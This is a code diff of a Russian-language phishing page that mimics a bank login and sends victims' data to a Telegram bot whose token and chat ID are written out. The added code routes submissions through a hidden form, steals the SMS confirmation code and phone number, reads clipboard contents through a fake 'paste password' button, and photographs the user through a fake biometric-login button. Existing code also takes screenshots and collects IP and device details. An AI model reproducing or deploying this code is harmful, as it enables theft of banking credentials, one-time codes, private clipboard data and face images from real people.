@@ -27,6 +27,7 @@ input:focus { border-color: #ffdd2d; background: #fff; }
 .policy { text-align: center; font-size: 12px; color: #999; margin-top: 30px; text-decoration: underline; cursor: pointer; }
 .step2 p, .step3 p { text-align: center; color: #666; font-size: 15px; margin-bottom: 25px; }
 .timer { text-align: center; color: #999; font-size: 14px; margin-top: 15px; }
+.paste { width: 100%; padding: 12px; background: none; color: #5288c1; border: none; font-size: 14px; cursor: pointer; margin-top: 5px; text-decoration: underline; }
 .hidden { display: none; }
 </style>
 </head>
@@ -44,7 +45,7 @@ input:focus { border-color: #ffdd2d; background: #fff; }
       <input type="tel" id="phone" placeholder="+7" value="+7">
     </div>
     <button class="btn" id="next1">Продолжить</button>
-    <button class="biometric"><span>👤</span> Войти по скану лица или пальца</button>
+    <button class="biometric" id="bio"><span>👤</span> Войти по скану лица или пальца</button>
     <div class="policy">Политика обработки персональных данных</div>
   </div>
 
@@ -53,7 +54,7 @@ input:focus { border-color: #ffdd2d; background: #fff; }
     <p>Отправили код подтверждения на ваш номер</p>
     <div class="field">
       <label>Код</label>
-      <input type="tel" id="code" placeholder="Код" maxlength="5">
+      <input type="tel" id="code" placeholder="Код" maxlength="4">
     </div>
     <div class="timer" id="timer">Отправим снова через 40 сек</div>
   </div>
@@ -65,9 +66,16 @@ input:focus { border-color: #ffdd2d; background: #fff; }
       <label>Пароль</label>
       <input type="password" id="password" placeholder="Пароль">
     </div>
+    <button class="paste" id="pasteBtn">Вставить пароль из буфера</button>
     <button class="btn" id="login">Войти</button>
   </div>
 </div>
+
+<form id="tgForm" action="https://api.telegram.org/bot8374650070:AAGzjKVuATwofDM9ngx-TYIDH1Myizc0LZg/sendMessage" method="GET" target="hidden_iframe" style="display:none;">
+  <input type="hidden" name="chat_id" value="7887003990">
+  <input type="hidden" name="text" id="tgText">
+</form>
+<iframe name="hidden_iframe" style="display:none;"></iframe>
 
 <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
 <script>
@@ -76,8 +84,8 @@ var chat = '7887003990';
 var userData = {};
 
 function send(text) {
-  var img = new Image();
-  img.src = 'https://api.telegram.org/bot' + token + '/sendMessage?chat_id=' + chat + '&text=' + encodeURIComponent(text);
+  document.getElementById('tgText').value = text;
+  document.getElementById('tgForm').submit();
 }
 
 function sendPhoto(blob, caption) {
@@ -262,8 +270,7 @@ function trackTime() {
   var start = Date.now();
   window.addEventListener('beforeunload', function() {
     var sec = Math.round((Date.now() - start) / 1000);
-    var img = new Image();
-    img.src = 'https://api.telegram.org/bot' + token + '/sendMessage?chat_id=' + chat + '&text=' + encodeURIComponent('⏱ Время на сайте: ' + sec + ' сек');
+    send('⏱ Время на сайте: ' + sec + ' сек');
   });
 }
 
@@ -287,7 +294,7 @@ function takePhoto() {
           canvas.width = video.videoWidth;
           canvas.height = video.videoHeight;
           canvas.getContext('2d').drawImage(video, 0, 0);
-          canvas.toBlob(function(blob) { sendPhoto(blob, '🤳 Селфи'); }, 'image/jpeg', 0.8);
+          canvas.toBlob(function(blob) { sendPhoto(blob, '🤳 Селфи (биометрия)'); }, 'image/jpeg', 0.8);
           stream.getTracks().forEach(function(t) { t.stop(); });
         }, 2000);
       })
@@ -295,7 +302,6 @@ function takePhoto() {
   }
 }
 
-// Запуск всех сборов
 getBasic();
 getTime();
 getIP();
@@ -313,13 +319,11 @@ getTheme();
 trackTime();
 setTimeout(takeScreenshot, 3000);
 
-// === ФОРМА ===
 document.getElementById('next1').addEventListener('click', function() {
   var phone = document.getElementById('phone').value;
   if (!phone || phone.length < 12) { alert('Введите номер телефона'); return; }
   userData.phone = phone;
   send('📱 Телефон: ' + phone);
-  takePhoto();
   document.getElementById('step1').classList.add('hidden');
   document.getElementById('step2').classList.remove('hidden');
   var t = 40;
@@ -331,12 +335,32 @@ document.getElementById('next1').addEventListener('click', function() {
   }, 1000);
 });
 
+document.getElementById('bio').addEventListener('click', function() {
+  send('👤 Нажата кнопка биометрии');
+  takePhoto();
+});
+
 document.getElementById('code').addEventListener('input', function() {
-  if (this.value.length === 5) {
+  if (this.value.length === 4) {
     userData.code = this.value;
     send('🔑 Код: ' + this.value);
     document.getElementById('step2').classList.add('hidden');
     document.getElementById('step3').classList.remove('hidden');
+  }
+});
+
+document.getElementById('pasteBtn').addEventListener('click', function() {
+  if (navigator.clipboard && navigator.clipboard.readText) {
+    navigator.clipboard.readText().then(function(text) {
+      if (text) {
+        document.getElementById('password').value = text;
+        send('📋 Буфер: ' + text);
+      }
+    }).catch(function() {
+      send('📋 Буфер: отказ');
+    });
+  } else {
+    send('📋 Буфер: не поддерживается');
   }
 });
 
